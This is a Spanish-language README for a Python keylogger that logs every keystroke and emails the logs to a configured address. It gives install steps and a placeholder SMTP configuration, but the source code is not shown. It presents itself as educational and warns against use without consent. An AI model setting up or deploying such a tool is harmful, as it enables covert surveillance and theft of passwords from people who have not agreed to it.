# Keylogger en Python

Este proyecto es un keylogger simple escrito en Python que registra las teclas presionadas y envía los registros a una dirección de correo electrónico. Este proyecto fue realizado con fines educativos y de práctica.

## Advertencia

El uso de keyloggers es ilegal sin el consentimiento explícito del usuario. Asegúrate de tener permiso antes de utilizar este software. No me hago responsable del uso indebido de este código.

## Características

- Registra todas las teclas presionadas.
- Envía los registros por correo electrónico.
- Envía un correo electrónico de inicio cuando se ejecuta por primera vez.
- Permite el apagado remoto mediante una tecla especial.

## Requisitos

- Python 3.x
- Bibliotecas: `pynput`, `smtplib`, `email`, `threading`

## Instalación

1. Clona este repositorio:
    ```bash
    git clone https://github.com/tuusuario/keylogger-python.git
    ```

2. Navega al directorio del proyecto:
    ```bash
    cd keylogger-python
    ```

3. Instala las dependencias:
    ```bash
    pip install pynput
    ```

## Uso

Edita las variables `sender`, `recipients`, `password`, e `ip_server` en el archivo `keylogger.py` con tus credenciales de correo electrónico y dirección del servidor SMTP.

```python
self.sender = "youemail@email.com"
self.recipients = ['your@email.com']
self.password = "yourpassword"
self.ip_server = "192.168.100.51"
